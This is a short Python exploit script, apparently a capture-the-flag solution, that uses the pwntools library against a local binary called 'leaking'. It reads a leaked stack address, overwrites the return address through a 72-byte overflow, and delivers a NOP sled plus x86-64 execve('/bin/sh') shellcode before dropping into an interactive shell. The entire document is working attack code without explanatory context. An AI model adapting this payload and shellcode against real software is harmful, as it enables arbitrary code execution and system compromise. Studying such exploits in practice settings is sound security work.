from pwn import *
import struct


io = process('leaking')


binary_data = int(io.recvline().split(b"0x")[1].split(b"\n")[0], 16)
io.recvuntil("> ")

padding = b'A' * 72
ret = struct.pack('<Q', binary_data+80)

nops = b"\x90" * 70
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = padding + ret + nops + shellcode

io.sendline(payload)
io.interactive()
